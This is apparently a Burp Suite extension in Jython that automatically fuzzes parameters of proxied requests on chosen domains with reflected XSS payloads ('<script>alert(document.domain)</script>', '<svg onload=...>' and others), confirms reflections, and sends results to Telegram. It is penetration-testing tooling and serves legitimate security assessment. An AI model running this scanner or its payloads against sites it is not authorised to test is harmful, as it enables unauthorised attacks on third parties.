# -*- coding: utf-8 -*-
from burp import IBurpExtender
from burp import IContextMenuFactory
from burp import ITab
from burp import IParameter  # Import the IParameter interface
from java.util import List, ArrayList
from java.io import PrintWriter
from javax.swing import JPanel, JButton, JTextArea, JScrollPane, JMenuItem, JTextField, JLabel, Box, BoxLayout
from java.awt import BorderLayout, GridLayout, FlowLayout, Dimension
import os
import threading
import time
from Queue import Queue, Empty  # Import Queue and Empty exceptions
from java.net import URLEncoder, URL, URLDecoder  # Import URLEncoder and URLDecoder
import re # Import re
import json
import sys
import socket
from javax.net.ssl import SSLContext
from javax.net.ssl import TrustManager
from javax.net.ssl import X509TrustManager
from java.security.cert import X509Certificate

class BurpExtender(IBurpExtender, IContextMenuFactory, ITab):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self.stdout = PrintWriter(callbacks.getStdout(), True)

        # Register context menu and extension
        callbacks.setExtensionName("Auto RXSS Scan")
        callbacks.registerContextMenuFactory(self)

        # Initialize UI before adding tab
        self.init_ui()
        callbacks.addSuiteTab(self)

        # Threading setup
        self.lock = threading.Lock()  # Initialize lock
        self.thread_count = 10
        self.task_queue = Queue()

        # XSS payloads file path
        self.payload_file = "xss.txt"
        self.payloads = self.load_payloads()

        # Store potential XSS vulnerability URLs with all details
        self.xss_vulnerable_urls = set()
        # Configure target domains (default target domain is empty)
        self.target_domains = []
        self.target_domain_patterns = []

        # Store processed request hashes to avoid duplicates
        self.processed_requests = set()

        self.log("Auto RXSS Scan Loaded Successfully")
        self.log("Author : https://x.com/intent/follow?screen_name=momika233")
        return

    def init_ui(self):
        self.panel = JPanel(BorderLayout())

        # Configuration Panel
        config_panel = JPanel(GridLayout(0, 2))
        self.telegram_api_key_label = JLabel("Telegram API Key:")
        self.telegram_api_key_field = JTextField(20)
        self.telegram_chat_id_label = JLabel("Telegram Chat ID:")
        self.telegram_chat_id_field = JTextField(20)
        self.target_domain_label = JLabel("Target Domains (comma-separated):")
        self.target_domain_field = JTextField(20)

        config_panel.add(self.telegram_api_key_label)
        config_panel.add(self.telegram_api_key_field)
        config_panel.add(self.telegram_chat_id_label)
        config_panel.add(self.telegram_chat_id_field)
        config_panel.add(self.target_domain_label)
        config_panel.add(self.target_domain_field)

        # Button Panel (adjust button size)
        button_panel = JPanel(FlowLayout(FlowLayout.CENTER))  # Use FlowLayout
        self.scan_button = JButton("Start XSS Scan", actionPerformed=self.start_scan)
        button_panel.add(self.scan_button)

        self.log_area = JTextArea(20, 50)
        self.log_area.setEditable(False)
        self.scroll_pane = JScrollPane(self.log_area)

        self.panel.add(config_panel, BorderLayout.NORTH)
        self.panel.add(button_panel, BorderLayout.CENTER)  # Use button_panel
        self.panel.add(self.scroll_pane, BorderLayout.SOUTH)

    def getTabCaption(self):
        return "Auto RXSS Scan"

    def getUiComponent(self):
        return self.panel

    def log(self, message):
        timestamp = time.strftime("%H:%M:%S", time.localtime())
        log_message = "[{}] {}".format(timestamp, message)
        with self.lock:
            self.log_area.append(log_message + "\n")
            self.log_area.setCaretPosition(self.log_area.getDocument().getLength())
            self.stdout.println(log_message)

    def load_payloads(self):
       payloads = [
            '"<img src=x onerror=alert(1)>',
            '<script>alert(document.domain)</script>',
            '<svg onload=alert(document.domain)>',
            '<details open ontoggle=alert(document.domain)>'
        ]
       return payloads

    def createMenuItems(self, invocation):
        menu_list = ArrayList()
        menu_item = JMenuItem("Run Auto RXSS Scan", actionPerformed=self.start_scan)
        menu_list.add(menu_item)
        return menu_list

    def start_scan(self, event):
        self.log("Initiating XSS scan process...")
        self.target_domains = []
        self.target_domain_patterns = []
        for domain in self.target_domain_field.getText().split(","):
            domain = domain.strip()
            if domain.startswith("*."):
                self.target_domain_patterns.append(re.compile(r"^[a-zA-Z0-9-]+\." + re.escape(domain[2:]) + "$")) # Fix regex
                self.log("Added domain pattern: {}".format(r"^[a-zA-Z0-9-]+\." + re.escape(domain[2:]) + "$"))
            else:
                self.target_domains.append(domain)
                self.log("Added target domain: {}".format(domain))


        self.log("Target domains specified: {}".format(self.target_domains))
        self.log("Target domain patterns specified: {}".format(self.target_domain_patterns))
        thread = threading.Thread(target=self.run_xss_test)
        thread.start()

    def get_target_requests(self): # Pass the target domain list
        all_requests = self._callbacks.getProxyHistory()
        target_requests = []

        for request in all_requests:
            try:
                url = str(self._helpers.analyzeRequest(request).getUrl())
                matched = False
                for domain in self.target_domains:
                    if domain in url:
                        matched = True
                        break
                if not matched:
                    for pattern in self.target_domain_patterns:
                        parsed_url = URL(url)
                        hostname = parsed_url.getHost()
                        if pattern.match(hostname):
                            matched = True
                            break
                if matched:
                    target_requests.append(request)
            except Exception as e:
                self.log("Error analyzing request: {}".format(e))

        return target_requests

    def run_xss_test(self):
        self.log("Starting XSS scan with {} payloads".format(len(self.payloads)))

        self.log("Target domains specified: {}".format(self.target_domains))
        self.log("Target domain patterns specified: {}".format(self.target_domain_patterns))

        # Get requests related to the target domains
        http_traffic = self.get_target_requests()

        self.log("Retrieved {} unique requests from target domains".format(len(http_traffic)))

        if not http_traffic:
            self.log("No requests found for specified domains. Ensure the domain is in Burp's SiteMap.")
            return

        # Clear the processed requests set before each scan
        self.processed_requests.clear()

        # Fill the task queue with traffic
        for i, traffic in enumerate(http_traffic, 1):
            self.task_queue.put((i, traffic))

        self.total_requests = 0

        # Start worker threads
        threads = []
        active_threads = min(self.thread_count, len(http_traffic))
        self.log("Starting {} worker threads".format(active_threads))
        for _ in range(active_threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        # Wait for all threads to complete
        for t in threads:
            t.join()

        self.log("Scan completed. Total requests sent: {}".format(self.total_requests))
        self.log("Performing follow-up requests on potentially vulnerable URLs...")
        self.perform_follow_up_requests()

    def worker(self):
        while True:
            try:
                i, traffic = self.task_queue.get_nowait()
                self.process_request(i, traffic)
                self.task_queue.task_done()
            except Empty:  # Capture Queue.Empty exception
                break  # Queue is empty, exit thread
            except Exception as e:
                self.log("Thread {} error: {}".format(threading.currentThread().getName(), str(e)))

    def process_request(self, index, traffic):
        try:
            request_info = self._helpers.analyzeRequest(traffic)
            parameters = request_info.getParameters()
            headers = request_info.getHeaders()
            method = request_info.getMethod()
            url = str(request_info.getUrl())

            # Create a unique hash for this request
            request_hash = hash(traffic.getRequest().tostring())

            # Skip if this request has already been processed
            if request_hash in self.processed_requests:
                self.log("Skipping duplicate request: {}".format(url))
                return

            self.log("Thread {} processing request {}/{}: {} {}".format(
                threading.currentThread().getName(), index, len(self._callbacks.getProxyHistory()), method, url))

            if not parameters:
                self.log("No parameters found in request {}".format(url))
                return

            self.log("Found {} parameters to test in {}".format(len(parameters), url))
            new_headers = ArrayList()
            for header in headers:
                new_headers.add(header)

            for param in parameters:
                param_name = param.getName()
                param_type = param.getType()
                param_type_str = self.get_param_type_str(param_type)
                self.log("Testing {} parameter: {} (Original value: {}) in {}".format(
                    param_type_str, param_name, param.getValue(), url))

                for payload in self.payloads:
                    with self.lock:
                        self.total_requests += 1
                        request_num = self.total_requests

                    # URL encode the payload
                    encoded_payload = URLEncoder.encode(payload, "UTF-8")  # Use UTF-8 encoding

                    # For all parameter types, use updateParameter
                    new_request = traffic.getRequest()  # Get the original request
                    try:
                        new_request = self._helpers.updateParameter(
                            new_request,
                            self._helpers.buildParameter(param_name, encoded_payload, param_type)
                        )
                    except Exception as e:
                        self.log("Error updating parameter: {}".format(str(e)))
                        continue  # If updating the parameter fails, skip this payload

                    self.log("Building request #{} for {}".format(request_num, url))

                    # Send request
                    try:
                        httpService = traffic.getHttpService()  # Get httpService
                        response = self._callbacks.makeHttpRequest(httpService, new_request)
                        self.log("Request #{} sent successfully".format(request_num))
                        is_vulnerable = self.analyze_response(response, payload, url, param_name, param_type_str)

                        if is_vulnerable:
                            # Convert new_request to a string for hashing
                            new_request_str = new_request.tostring()
                            self.xss_vulnerable_urls.add((url, param_name, param_type_str, encoded_payload, new_request_str, httpService))

                    except Exception as e:
                        self.log("Failed to send request #{}: {}".format(request_num, str(e)))
                    time.sleep(0.1)  # Slight delay

            # Add the request hash to the processed requests set
            self.processed_requests.add(request_hash)

        except Exception as e:
            self.log("Error processing request {}: {}".format(url, str(e)))

    def get_param_type_str(self, param_type):
        if param_type == IParameter.PARAM_URL:
            return "URL"
        elif param_type == IParameter.PARAM_BODY:
            return "BODY"
        elif param_type == IParameter.PARAM_COOKIE:
            return "COOKIE"
        elif param_type == IParameter.PARAM_JSON:
            return "JSON"  # Fix the string here
        else:
            return "OTHER"

    def analyze_response(self, response, payload, url, param_name, param_type_str):
        # Add a variable to track if XSS is detected
        xss_found = False

        if response:
            response_body = self._helpers.bytesToString(response.getResponse())
             # Try to search for encoded payload and original payload
            if payload in response_body or payload.lower() in response_body.lower(): # Search original payload
                xss_found = True

        # Add detailed logs
        self.log("Analyzing Response for XSS:")
        self.log("  URL: {}".format(url))
        self.log("  Parameter: {} ({})".format(param_name, param_type_str))
        self.log("  Payload: {}".format(payload))
        self.log("  XSS Found: {}".format(xss_found))

        if xss_found:
            self.log("[+] Potential XSS found in URL: {} | Parameter ({}): {} | Payload: {}".format(
            url, param_type_str, param_name, payload))
            return True
        else:
            return False

    def perform_follow_up_requests(self):
        self.log("Starting follow-up requests on potential XSS vulnerabilities...")
        for url, param_name, param_type_str, encoded_payload, original_request_str, httpService in self.xss_vulnerable_urls:
            # Construct a unique, easily identifiable payload
            follow_up_payload = "<script>alert('xss-tester-" + str(time.time()) + "')</script>"
            encoded_follow_up_payload = URLEncoder.encode(follow_up_payload, "UTF-8")

            # Modify how follow-up requests are built, using the original request's httpService and method
            try:
                # Convert the request string back to a byte array
                original_request = self._helpers.stringToBytes(original_request_str)

                # Based on the parameter type, update the parameters of the original request
                if param_type_str == "URL":
                    new_request = self._helpers.updateParameter(
                        original_request,
                        self._helpers.buildParameter(param_name, encoded_follow_up_payload, IParameter.PARAM_URL)
                    )
                elif param_type_str == "BODY":
                    new_request = self._helpers.updateParameter(
                        original_request,
                        self._helpers.buildParameter(param_name, encoded_follow_up_payload, IParameter.PARAM_BODY)
                    )
                elif param_type_str == "COOKIE":
                    new_request = self._helpers.updateParameter(
                        original_request,
                        self._helpers.buildParameter(param_name, encoded_follow_up_payload, IParameter.PARAM_COOKIE)
                    )
                elif param_type_str == "JSON": #json type processing
                    new_request = self._helpers.updateParameter(
                        original_request,
                        self._helpers.buildParameter(param_name, encoded_follow_up_payload, IParameter.PARAM_JSON)
                    )
                else:
                    self.log("Unsupported parameter type for follow-up request: {}".format(param_type_str))
                    continue

                # Send request
                response = self._callbacks.makeHttpRequest(httpService, new_request)
                response_body = self._helpers.bytesToString(response.getResponse())

                # Check if the follow-up payload is executed (e.g., search for the unique string)
                if "xss-tester-" in response_body:
                    self.log("[++] Confirmed XSS vulnerability in URL: {} | Parameter ({}): {}".format(url, param_type_str, param_name))
                    self.send_telegram_notification(url, encoded_payload)  # Send Telegram notification
                else:
                    self.log("[--] Follow-up request did not confirm XSS in URL: {} | Parameter ({}): {}".format(url, param_type_str, param_name))

            except Exception as e:
                self.log("Error sending follow-up request for URL {}: {}".format(url, str(e)))
        self.log("Follow-up requests completed.")



    def send_telegram_notification(self, url, encoded_payload):
        telegram_api_key = self.telegram_api_key_field.getText().strip()
        telegram_chat_id = self.telegram_chat_id_field.getText().strip()

        if not telegram_api_key or not telegram_chat_id:
            self.log("Telegram API key or Chat ID is missing. Please configure in the UI.")
            return

        message = "Confirmed XSS vulnerability found!\nURL: {}\nPayload: {}".format(url, encoded_payload)  # Use encoded_payload
        # URL encode the message
        encoded_message = URLEncoder.encode(message, "UTF-8")
        send_text = 'https://api.telegram.org/bot' + telegram_api_key + '/sendMessage?chat_id=' + telegram_chat_id + '&text=' + encoded_message

        try:
            # Build URL object
            url_obj = URL(send_text)
            # Build HTTP connection
            # Use the original HTTP service (if HTTPS, then port 443, else 80)
            is_https = url.startswith("https")
            httpsService = self._helpers.buildHttpService(str(url_obj.getHost()), 443 if is_https else 80, "https" if is_https else "http")

            # Build request
            request = self._helpers.buildHttpRequest(url_obj)

            # Send request
            response = self._callbacks.makeHttpRequest(httpsService, request)

            # Analyze response
            responseBody = self._helpers.bytesToString(response.getResponse())
            if "true" in responseBody.lower():
                self.log("Telegram notification sent successfully.")
            else:
                self.log("Failed to send Telegram notification. Response: {}".format(responseBody))

        except Exception as e:
            self.log("Error sending Telegram notification: {}".format(str(e)))


    def get_param_type_code(self, param_type_str):
        if param_type_str == "URL":
            return IParameter.PARAM_URL
        elif param_type_str == "BODY":
            return IParameter.PARAM_BODY
        elif param_type_str == "COOKIE":
            return IParameter.PARAM_COOKIE
        elif param_type_str == "JSON":
            return IParameter.PARAM_JSON
        else:
            return IParameter.PARAM_URL  # Default to URL

if __name__ == "__main__":
    pass
